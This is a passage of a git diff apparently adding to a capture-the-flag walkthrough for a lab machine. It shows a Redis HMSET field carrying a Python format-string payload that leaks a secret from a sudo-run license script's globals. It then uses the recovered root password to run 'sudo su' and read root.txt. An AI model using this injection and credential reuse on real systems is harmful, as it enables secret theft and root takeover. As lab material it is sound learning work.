@@ -350,3 +350,22 @@ HMSET evil first-name "{license.__init__.__globals__[secret_encoded]}" last-name
 exit;
 
 run sudo /usr/bin/license -p evil (as USER cooper);
+
+
+![image](https://github.com/st1llz0r/Format/assets/142597099/520a64ab-bf34-46ef-864a-4c3539a4041d)
+
+Read carefully the output;
+
+unCR4ckaBL3Pa$$w0rd - this is root PW;
+
+GGWP;
+
+Run sudo su;
+
+enter pass: unCR4ckaBL3Pa$$w0rd;
+
+
+cat root.txt
+
+echo it
+
